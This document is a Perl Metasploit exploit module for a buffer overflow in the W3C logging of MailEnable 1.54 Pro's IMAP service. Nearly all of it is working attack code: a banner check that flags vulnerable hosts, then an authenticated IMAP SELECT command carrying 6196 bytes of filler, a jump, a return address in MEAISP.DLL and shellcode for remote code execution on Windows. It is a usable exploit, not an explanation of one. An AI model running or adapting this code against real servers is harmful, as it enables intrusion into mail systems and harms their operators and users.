MailEnable 1.54 Pro Universal IMAPD W3C Logging BoF Exploit
===========================================================

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::mailenable_imap_w3c;
use strict;
use base &#039;Msf::Exploit&#039;;
use Msf::Socket::Tcp;
use Pex::Text;

my $advanced = {
  };

my $info = {
	&#039;Name&#039;    => &#039;MailEnable IMAPD W3C Logging Buffer Overflow&#039;,
	&#039;Version&#039;  => &#039;$Revision: 1.1 $&#039;,
	&#039;Authors&#039; => [ &#039;y0 <y0 [at] w00t-shell.net>&#039;, ],
	&#039;Arch&#039;    => [ &#039;x86&#039; ],
	&#039;OS&#039;      => [ &#039;win32&#039;, &#039;winnt&#039;, &#039;win2000&#039;, &#039;winxp&#039;, &#039;win2003&#039;],
	&#039;Priv&#039;    => 1,
	&#039;AutoOpts&#039;  =>
	  {
		&#039;EXITFUNC&#039;  => &#039;thread&#039;,
	  },
	&#039;UserOpts&#039;  =>
	  {
		&#039;RHOST&#039; => [1, &#039;ADDR&#039;, &#039;The target address&#039;],
		&#039;RPORT&#039; => [1, &#039;PORT&#039;, &#039;The target port&#039;, 143],
		&#039;USER&#039;  => [1, &#039;DATA&#039;, &#039;IMAP Username&#039;],
		&#039;PASS&#039;  => [1, &#039;DATA&#039;, &#039;IMAP Password&#039;],

	  },
	&#039;Payload&#039; =>
	  {
		&#039;Prepend&#039;   => "\x81\xec\x96\x40\x00\x00\x66\x81\xe4\xf0\xff",
		&#039;Space&#039;     => 600,
		&#039;BadChars&#039;  => "\x00\x0a\x0d\x20",
		&#039;Keys&#039;      => [&#039;+ws2ord&#039;],
	  },
	&#039;Description&#039;  => Pex::Text::Freeform(qq{
		This module exploits a buffer overflow in the W3C logging
	functionality of the MailEnable IMAPD service. Logging is not
	enabled by default and this exploit requires a valid username
	and password to exploit the flaw. MailEnable Professional version
	1.6 and prior and MailEnable Enterprise version 1.1 and prior are
	affected.    
}),
	&#039;Refs&#039;  =>
	  [
		[&#039;BID&#039;, 15006],
	  ],
	&#039;Targets&#039; =>
	  [
		[&#039;MailEnable 1.54 Pro Universal&#039;, 0x1001c019], #MEAISP.DLL
	  ],
	&#039;Keys&#039; => [&#039;imap&#039;],
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({&#039;Info&#039; => $info, &#039;Advanced&#039; => $advanced}, @_);

	return($self);
}

sub Check {
	my ($self) = @_;
	my $target_host = $self->GetVar(&#039;RHOST&#039;);
	my $target_port = $self->GetVar(&#039;RPORT&#039;);

	my $s = Msf::Socket::Tcp->new
	  (
		&#039;PeerAddr&#039;  => $target_host,
		&#039;PeerPort&#039;  => 25,
		&#039;LocalPort&#039; => $self->GetVar(&#039;CPORT&#039;),
		&#039;SSL&#039;       => $self->GetVar(&#039;SSL&#039;),
	  );

	if ($s->IsError) {
		$self->PrintLine(&#039;[*] Error creating socket: &#039; . $s->GetError);
		return $self->CheckCode(&#039;Connect&#039;);
	}

	$s->Send("QUIT\r\n");
	my $res = $s->Recv(-1, 20);
	$s->Close();

	if ($res !~ /MailEnable Service, Version: 0-1\.54/) {
		$self->PrintLine("[*] This server does not appear to be vulnerable.");
		return $self->CheckCode(&#039;Safe&#039;);
	}

	$self->PrintLine("[*] Vulnerable installation detected :-)");
	return $self->CheckCode(&#039;Detected&#039;);
}

sub Exploit {
	my $self = shift;

	my $targetHost  = $self->GetVar(&#039;RHOST&#039;);
	my $targetPort  = $self->GetVar(&#039;RPORT&#039;);
	my $targetIndex = $self->GetVar(&#039;TARGET&#039;);
	my $user        = $self->GetVar(&#039;USER&#039;);
	my $pass        = $self->GetVar(&#039;PASS&#039;);
	my $encodedPayload = $self->GetVar(&#039;EncodedPayload&#039;);
	my $shellcode   = $encodedPayload->Payload;
	my $target = $self->Targets->[$targetIndex];

	my $sock = Msf::Socket::Tcp->new(
		&#039;PeerAddr&#039; => $targetHost,
		&#039;PeerPort&#039; => $targetPort,
	  );
	if($sock->IsError) {
		$self->PrintLine(&#039;Error creating socket: &#039; . $sock->GetError);
		return;
	}

	my $resp = $sock->Recv(-1);
	chomp($resp);
	$self->PrintLine(&#039;[*] Got Banner: &#039; . $resp);

	my $sploit = "a01 LOGIN $user $pass\r\n";
	$sock->Send($sploit);
	my $resp = $sock->Recv(-1);
	if($sock->IsError) {
		$self->PrintLine(&#039;Socket error: &#039; . $sock->GetError);
		return;
	}
	if($resp !~ /^a01 BAD LOGIN-/) {
		$self->PrintLine(&#039;Login error: &#039; . $resp);
		return;
	}
	$self->PrintLine(&#039;[*] Logged in, sending overflow&#039;);

	my $splat = Pex::Text::AlphaNumText(6196);
	$sploit =
	  "a01 SELECT ". $splat.
	  "\xeb\x06".  pack(&#039;V&#039;, $target->[1]).
	  $shellcode. "\r\n";

	$sock->Send($sploit);

	my $resp = $sock->Recv(-1);
	if(length($resp)) {
		$self->PrintLine(&#039;[*] Got response, bad: &#039; . $resp);
	}

	return;

}

1;


